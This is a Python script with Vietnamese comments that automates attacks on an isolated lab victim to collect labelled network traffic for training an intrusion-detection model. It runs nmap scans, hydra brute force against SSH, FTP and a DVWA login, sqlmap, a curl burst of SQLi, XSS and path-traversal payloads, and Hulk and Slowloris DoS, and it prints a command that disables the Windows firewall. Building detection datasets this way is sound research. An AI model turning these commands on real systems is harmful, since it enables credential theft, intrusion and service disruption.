#!/usr/bin/env python3
"""
auto_attack_v4.py — Script thu thập tấn công ISOLATED (chuẩn hoá)
================================================================
Cải tiến so với v3 (rút ra từ các lỗi thực tế khi thu data):

  1. PORTSCAN PREFLIGHT — kiểm tra firewall victim: cổng đóng có trả RST không.
     Đây là lỗi lớn nhất ở v3: nếu victim DROP (filtered) cổng đóng → flow scan
     1 gói bị CICFlowMeter loại → mất "port-spread" → PortScan data hỏng (chỉ còn
     vài cổng mở) → model nhầm thành DoS. v4 phát hiện sớm và yêu cầu tắt firewall.

  2. THAM SỐ HOÁ + CÂN BẰNG — kiểm soát quy mô từng loại (tránh vụ bruteforce 200k
     trong khi portscan 131). Mặc định nhắm ~15–25k flow/loại.

  3. PREFLIGHT đầy đủ: ping victim, kiểm tra dịch vụ đúng theo loại, kiểm tra tool.

  4. Gán nhãn theo IP: in rõ Attacker IP (IP NAT mà victim thấy) để build corpus đúng.

Cách chạy (trên Máy 1 — Attacker, mỗi loại 1 phiên capture riêng trên Victim):
    python3 auto_attack_v4.py --target 192.168.0.103 --type portscan
    python3 auto_attack_v4.py --target 192.168.0.103 --type bruteforce
    python3 auto_attack_v4.py --target 192.168.0.103 --type webattack
    python3 auto_attack_v4.py --target 192.168.0.103 --type dos

Tham số chính:
    --type     portscan | bruteforce | webattack | dos   (hoặc --phase, alias)
    --target   IP victim
    --rounds   số vòng quét PortScan (mặc định 15)
    --threads  số luồng hydra (mặc định 32)
    --cmd-time giây mỗi lệnh brute/web (mặc định 120)
    --force    bỏ qua cảnh báo firewall PortScan, vẫn chạy
    --skip-check  bỏ kiểm tra tool
"""
import argparse
import csv
import os
import random
import shutil
import subprocess
import sys
import time
from datetime import datetime

WORDLIST = "/usr/share/wordlists/rockyou.txt"

C = {"R": "\033[0;31m", "G": "\033[0;32m", "Y": "\033[1;33m",
     "B": "\033[0;34m", "C": "\033[0;36m", "N": "\033[0m"}


def log(msg, c="N"):
    print(f"{C[c]}{msg}{C['N']}")


def now_ms():
    return int(time.time() * 1000)


# ============================================================================
# PREFLIGHT
# ============================================================================
def check_tools(extra):
    base = ["nmap"]
    need = base + extra
    missing = [t for t in need if not shutil.which(t)]
    if missing:
        log(f"[!] Thiếu tool: {', '.join(missing)}", "R")
        log(f"    Cài: sudo apt install -y {' '.join(missing)}", "Y")
        return False
    if ("hydra" in need) and not os.path.exists(WORDLIST):
        log(f"[!] Thiếu wordlist {WORDLIST}", "R")
        log("    Chạy: sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz", "Y")
        return False
    return True


def check_conn(target):
    log(f"[preflight] Ping {target}...", "Y")
    if subprocess.run(f"ping -c1 -W2 {target}", shell=True,
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
        log(f"  ✓ {target} reachable", "G")
        return True
    log(f"  ✗ Không ping được {target}. Kiểm tra mạng!", "R")
    return False


def check_port(target, port, name):
    """Kiểm tra 1 dịch vụ TCP có mở không (cho brute/web/dos)."""
    out = subprocess.run(f"nmap -sT -Pn -p {port} --max-retries 1 {target}",
                         shell=True, capture_output=True, text=True).stdout
    if f"{port}/tcp open" in out:
        log(f"  ✓ Dịch vụ {name} (cổng {port}) đang mở", "G")
        return True
    log(f"  ⚠ Dịch vụ {name} (cổng {port}) KHÔNG mở — bật trên victim trước khi thu", "Y")
    return False


def portscan_firewall_preflight(target, force):
    """Cốt lõi v4: cổng đóng phải trả RST (closed) chứ không bị DROP (filtered),
    nếu không scan flows sẽ bị mất → PortScan data hỏng."""
    log("[preflight] Kiểm tra firewall victim (cổng đóng trả RST hay bị drop)...", "Y")
    try:
        out = subprocess.run(f"nmap -sT -Pn -p 9000-9060 --max-retries 0 {target}",
                             shell=True, capture_output=True, text=True, timeout=60).stdout
    except subprocess.TimeoutExpired:
        out = ""
    closed = ("closed" in out) or ("conn-refused" in out)
    filtered = ("filtered" in out) or ("no-response" in out)
    if closed and not filtered:
        log("  ✓ Cổng đóng trả RST → scan flows sẽ được CICFlowMeter giữ. TỐT.", "G")
        return True
    log("  ⚠⚠ Cổng đóng bị FILTERED/DROP — firewall victim đang BẬT.", "R")
    log("     → Scan flows (1 gói) sẽ bị loại → PortScan chỉ còn vài cổng mở → DATA HỎNG.", "R")
    log("     → TẮT firewall trên VICTIM rồi chạy lại:", "Y")
    log("         Windows (victim host): netsh advfirewall set allprofiles state off", "Y")
    log("         (hoặc tắt Windows Defender Firewall cho mạng đang dùng)", "Y")
    if force:
        log("  [--force] Vẫn tiếp tục dù firewall bật (PortScan có thể ít flow).", "Y")
        return True
    ans = input("  Tiếp tục thu PortScan dù vậy? (y/N): ").strip().lower()
    return ans == "y"


# ============================================================================
# CHẠY 1 LỆNH + GHI GROUND TRUTH
# ============================================================================
def run_cmd(command, atype, dst_ip, dst_port, desc, writer, i, total):
    log(f"\n  [{i}/{total}] {atype}: {desc}", "C")
    start = now_ms()
    try:
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL).wait()
    except KeyboardInterrupt:
        log("\n[!] Ngắt bởi người dùng", "R")
        return False
    end = now_ms()
    writer.writerow({"attack_type": atype, "src_ip": "Attacker", "dst_ip": dst_ip,
                     "dst_port": dst_port, "start_time_ms": start, "end_time_ms": end,
                     "params": desc})
    log(f"      ✓ {(end - start) / 1000:.1f}s", "G")
    return True


def idle(a, b):
    time.sleep(random.randint(a, b))


# ============================================================================
# CÁC LOẠI TẤN CÔNG
# ============================================================================
def phase_portscan(target, writer, args):
    ranges = ["1-5000", "5001-10000", "10001-16000", "16001-22000"]
    total = args.rounds * len(ranges)
    log(f"\n██ PORTSCAN — {args.rounds} vòng × {len(ranges)} dải (~{total} lượt quét)", "C")
    n = 0
    for r in range(1, args.rounds + 1):
        for rng in ranges:
            n += 1
            cmd = f"sudo nmap -sT -Pn -T5 -p {rng} --max-retries 0 {target}"
            if not run_cmd(cmd, "PortScan", target, "Multiple",
                           f"TCP scan {rng} (vòng {r}/{args.rounds})", writer, n, total):
                return
            idle(2, 4)


def phase_bruteforce(target, writer, args):
    cmds = []
    for u in ["root", "admin", "user", "ubuntu", "test"]:
        cmds.append((f"timeout {args.cmd_time}s hydra -l {u} -P {WORDLIST} ssh://{target} -t {args.threads}",
                     f"SSH brute {u}", "22"))
    for u in ["admin", "root", "user", "ftp"]:
        cmds.append((f"timeout {args.cmd_time}s hydra -l {u} -P {WORDLIST} ftp://{target} -t {args.threads}",
                     f"FTP brute {u}", "21"))
    log(f"\n██ BRUTE FORCE — {len(cmds)} lệnh × {args.cmd_time}s × {args.threads} threads", "C")
    for i, (cmd, desc, port) in enumerate(cmds, 1):
        if not run_cmd(cmd, "Brute Force", target, port, desc, writer, i, len(cmds)):
            return
        idle(3, 6)


def phase_webattack(target, writer, args):
    cmds = []
    for ep, meth in [("/DVWA/login.php", "http-get"), ("/", "http-get"),
                     ("/DVWA/login.php", 'http-form-post "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:failed"')]:
        if "form-post" in meth:
            cmds.append((f"timeout {args.cmd_time}s hydra -l admin -P {WORDLIST} {target} {meth} -t {args.threads}",
                         f"HTTP brute {ep}", "80"))
        else:
            cmds.append((f"timeout {args.cmd_time}s hydra -l admin -P {WORDLIST} {target} {meth} {ep} -t {args.threads}",
                         f"HTTP brute {ep}", "80"))
    for params, desc in [("--forms --batch --dbs --level=3 --risk=3", "SQLi level3"),
                         ("--forms --batch --tables --level=3 --risk=2", "SQLi tables")]:
        cmds.append((f"timeout {args.cmd_time}s sqlmap -u 'http://{target}/DVWA/login.php' {params}", desc, "80"))
    # curl burst payload XSS/SQLi/traversal
    burst = (f"timeout {args.cmd_time}s bash -c 'while true; do "
             f"curl -s -o /dev/null -m1 \"http://{target}/DVWA/login.php?u=admin%27OR%271%27%3D%271\"; "
             f"curl -s -o /dev/null -m1 \"http://{target}/DVWA/\" -d \"x=%3Cscript%3Ealert(1)%3C/script%3E\"; "
             f"curl -s -o /dev/null -m1 \"http://{target}/../../../etc/passwd\"; sleep 0.02; done'")
    cmds.append((burst, "XSS+SQLi+traversal curl burst", "80"))
    log(f"\n██ WEB ATTACK — {len(cmds)} lệnh", "C")
    for i, (cmd, desc, port) in enumerate(cmds, 1):
        if not run_cmd(cmd, "Web Attack", target, port, desc, writer, i, len(cmds)):
            return
        idle(3, 6)


def phase_dos(target, writer, args):
    cmds = []
    if os.path.exists("./hulk/hulk.py"):
        for i in range(5):
            cmds.append((f"timeout 12s python3 ./hulk/hulk.py http://{target}", f"Hulk burst #{i+1}", "80"))
    else:
        log("  [⚠] Thiếu ./hulk/hulk.py — chỉ dùng Slowloris", "Y")
    for conns, dur in [(120, 12), (150, 12), (180, 10)]:
        cmds.append((f"timeout {dur}s slowloris {target} -p 80 -s {conns}", f"Slowloris {conns} conn", "80"))
    log(f"\n██ DoS — {len(cmds)} lệnh (Hulk + Slowloris)", "C")
    for i, (cmd, desc, port) in enumerate(cmds, 1):
        if not run_cmd(cmd, "DoS", target, port, desc, writer, i, len(cmds)):
            return
        idle(8, 12)


PHASES = {"portscan": phase_portscan, "bruteforce": phase_bruteforce,
          "webattack": phase_webattack, "dos": phase_dos}
# dịch vụ cần kiểm tra trước mỗi loại: (port, tên)
SERVICE = {"bruteforce": [(22, "SSH"), (21, "FTP")],
           "webattack": [(80, "HTTP/DVWA")], "dos": [(80, "HTTP")], "portscan": []}
TOOLS = {"portscan": [], "bruteforce": ["hydra"], "webattack": ["hydra", "sqlmap", "curl"], "dos": ["slowloris"]}


# ============================================================================
# MAIN
# ============================================================================
def main():
    ap = argparse.ArgumentParser(description="auto_attack_v4 — thu tấn công isolated chuẩn hoá")
    ap.add_argument("--target", required=True, help="IP victim")
    ap.add_argument("--type", "--phase", dest="type", required=True,
                    choices=list(PHASES.keys()), help="loại tấn công")
    ap.add_argument("--run-name", default=None, help="tên phiên (mặc định <type>_only)")
    ap.add_argument("--rounds", type=int, default=15, help="số vòng PortScan")
    ap.add_argument("--threads", type=int, default=32, help="số luồng hydra")
    ap.add_argument("--cmd-time", dest="cmd_time", type=int, default=120, help="giây mỗi lệnh brute/web")
    ap.add_argument("--force", action="store_true", help="bỏ qua cảnh báo firewall PortScan")
    ap.add_argument("--skip-check", action="store_true", help="bỏ kiểm tra tool")
    args = ap.parse_args()

    run_name = args.run_name or f"{args.type}_only"
    attacker_hint = "192.168.0.106"  # IP NAT host mà victim thấy — dùng gán nhãn label-by-IP

    log("=" * 60, "C")
    log(f"  AUTO ATTACK v4 — type={args.type} | target={args.target}", "C")
    log(f"  Attacker IP (victim thấy, để gán nhãn): {attacker_hint}", "C")
    log("=" * 60, "C")

    # preflight
    if not args.skip_check and not check_tools(TOOLS[args.type]):
        sys.exit(1)
    if not check_conn(args.target):
        sys.exit(1)
    for port, name in SERVICE[args.type]:
        check_port(args.target, port, name)
    if args.type == "portscan":
        if not portscan_firewall_preflight(args.target, args.force):
            log("[*] Hủy. Hãy tắt firewall victim rồi chạy lại.", "Y")
            sys.exit(1)

    # ground truth log
    os.makedirs("../docs", exist_ok=True)
    gt = f"../docs/ground_truth_log_{run_name}.csv"
    if os.path.exists(gt):
        os.remove(gt)
    log(f"\n[*] Ground truth: {gt}", "B")
    log("[*] ĐẢM BẢO tcpdump trên VICTIM đang chạy cho phiên này.", "Y")
    input("    Nhấn Enter khi sẵn sàng (Ctrl+C để hủy)... ")

    t0 = datetime.now()
    with open(gt, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=["attack_type", "src_ip", "dst_ip", "dst_port",
                                          "start_time_ms", "end_time_ms", "params"])
        w.writeheader()
        PHASES[args.type](args.target, w, args)

    log(f"\n{'='*60}", "G")
    log(f"  HOÀN TẤT '{args.type}' trong {str(datetime.now() - t0).split('.')[0]}", "G")
    log("  Tiếp: Victim Ctrl+C tcpdump → ./cfm <pcap> ~/cicflow/ →", "G")
    log(f"        copy {args.type}_only.pcap_Flow.csv vào Replay_Live_Detection/data/", "G")
    log("=" * 60, "G")


if __name__ == "__main__":
    main()
